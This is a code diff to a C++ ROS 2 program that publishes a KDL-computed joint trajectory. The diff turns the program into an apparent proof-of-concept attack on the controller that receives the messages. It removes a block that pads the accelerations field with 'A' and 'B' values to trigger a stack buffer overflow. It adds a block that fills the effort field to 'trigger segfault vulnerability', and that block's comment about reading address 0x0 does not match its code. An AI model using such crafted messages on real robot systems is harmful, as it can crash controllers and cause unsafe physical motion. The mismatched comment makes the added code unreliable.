@@ -1,3 +1,4 @@
+
 #include <kdl/chainfksolverpos_recursive.hpp>
 #include <kdl/chainiksolvervel_pinv.hpp>
 #include <kdl/jntarray.hpp>
@@ -43,7 +44,7 @@ int main(int argc, char ** argv)
   trajectory_msgs::msg::JointTrajectoryPoint trajectory_point_msg;
   trajectory_point_msg.positions.resize(chain.getNrOfJoints());
   trajectory_point_msg.velocities.resize(chain.getNrOfJoints());
-  
+
   double total_time = 3.0;
   int trajectory_len = 200;
   int loop_rate = static_cast<int>(std::round(trajectory_len / total_time));
@@ -53,7 +54,7 @@ int main(int argc, char ** argv)
   {
     double t = i;
     twist.vel.x(2 * 0.3 * cos(2 * M_PI * t / trajectory_len));
-   twist.vel.y(-0.3 * sin(2 * M_PI * t / trajectory_len));
+    twist.vel.y(-0.3 * sin(2 * M_PI * t / trajectory_len));
 
     ik_vel_solver_->CartToJnt(joint_positions, twist, joint_velocities);
 
@@ -66,27 +67,22 @@ int main(int argc, char ** argv)
 
     joint_positions.data += joint_velocities.data * dt;
 
+    // trigger segfault vulnerability
+    if (i >= 50) {
+      trajectory_point_msg.effort.resize(5);
+      trajectory_point_msg.effort[0] = 0.0; // attempt to read address 0x0
+      trajectory_point_msg.effort[1] = 1.0;
+      trajectory_point_msg.effort[2] = 0.0;
+      trajectory_point_msg.effort[3] = 0.0;
+      trajectory_point_msg.effort[4] = 0.0;
+    } else {
+      trajectory_point_msg.effort.clear(); 
+    }
+
     trajectory_point_msg.time_from_start.sec = i / loop_rate;
     trajectory_point_msg.time_from_start.nanosec = static_cast<int>(
       1E9 / loop_rate *
       static_cast<double>(t - loop_rate * (i / loop_rate)));
-
-    // trigger stack bof after 50 rounds
-    if (i >= 50) {
-      trajectory_point_msg.accelerations.resize(50);
-      trajectory_point_msg.accelerations[0] = 32.0;
-      for (int j = 1; j <= 32; j++) {
-        trajectory_point_msg.accelerations[j] = 65.0;  // 'A'
-      }
-      for (int j = 33; j < 40; j++) {
-        trajectory_point_msg.accelerations[j] = 66.0;  // 'B'
-      }
-      for (int j = 40; j < 50; j++) {
-        trajectory_point_msg.accelerations[j] = 0.0;
-      }
-    } else {
-      trajectory_point_msg.accelerations.clear();
-    }
 
     trajectory_msg.points.push_back(trajectory_point_msg);
   }
